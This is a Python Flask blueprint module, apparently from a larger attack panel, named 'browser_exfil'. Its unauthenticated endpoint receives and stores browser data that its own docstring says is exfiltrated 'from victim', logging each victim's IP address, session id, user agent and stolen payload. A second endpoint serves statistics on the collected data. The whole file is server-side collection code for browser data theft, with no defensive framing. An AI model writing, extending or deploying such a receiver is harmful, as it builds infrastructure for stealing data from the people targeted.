"""browser_exfil blueprint (P3 batch extract)."""
from __future__ import annotations

import os, json, base64
import uuid as uuid_module
from datetime import datetime, timedelta
from functools import wraps
from flask import (Blueprint, request, jsonify, redirect, url_for, render_template, send_from_directory, make_response, session, Response)
from app.state import *  # noqa: F401,F403  -- P3
from app.state import BASE_DIR, CONFIG, _decode_data_url, _save_mobile_capture
import database as db

from collections import defaultdict
from app.services import intel as intelsvc
bp = Blueprint("browser_exfil", __name__,
               template_folder=os.path.join(BASE_DIR, "flask_templates"))


@bp.route('/api/browser-exfil/receive', methods=['POST'])
def api_browser_exfil_receive():
    """Receive exfiltrated browser data from victim"""
    data = request.json or {}
    victim_ip = request.remote_addr
    session_id = data.get('session_id', '')
    data_type = data.get('type', 'unknown')
    exfil_data = data.get('data', {})
    metadata = data.get('metadata', {})
    metadata['user_agent'] = request.headers.get('User-Agent', '')
    exfil_id = intelsvc.save_browser_exfil(victim_ip, session_id, data_type, exfil_data, metadata)
    return jsonify({'status': 'received', 'id': exfil_id})

@bp.route('/api/browser-exfil/stats')
def api_browser_exfil_stats():
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    return jsonify(intelsvc.browser_exfil_stats())
